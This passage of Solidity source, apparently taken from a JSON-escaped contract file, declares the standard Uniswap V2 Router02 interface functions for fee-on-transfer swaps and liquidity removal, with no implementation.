getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);\r\n}\r\n\r\n\r\ninterface IUniswapV2Router02 is IUniswapV2Router01 {\r\n    function removeLiquidityETHSupportingFeeOnTransferTokens(\r\n        address token,\r\n        uint liquidity,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountETH);\r\n\r\n    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\r\n        address token,\r\n        uint liquidity,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline,\r\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\r\n    ) external returns (uint amountETH);\r\n\r\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n\r\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external payable;\r\n\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n}\r\n"}}